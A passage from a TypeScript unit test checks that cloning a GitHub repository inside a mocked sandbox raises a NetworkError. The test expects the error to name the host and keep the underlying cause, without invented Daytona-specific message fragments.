    getMock.mockResolvedValue(sandbox);

    try {
      await cloneRepositoryInSandbox({
        remoteId: SANDBOX_REMOTE_ID,
        url: "https://github.com/acme/widget.git",
        branch: "main",
      });
      throw new Error("expected cloneRepositoryInSandbox to throw");
    } catch (caught) {
      const err = caught as Error;
      expect(err.name).toBe("NetworkError");
      expect(err.message).toContain("host=github.com");
      expect(err.message).toContain("Connection reset by peer");
      // No fabricated Daytona-specific fragments when the underlying
      // error is not a `DaytonaError`.
      expect(err.message).not.toMatch(/Daytona HTTP/);
      expect(err.message).not.toMatch(/\bcode=/);
      expect(err.cause).toBe(underlying);
    }
  });
});
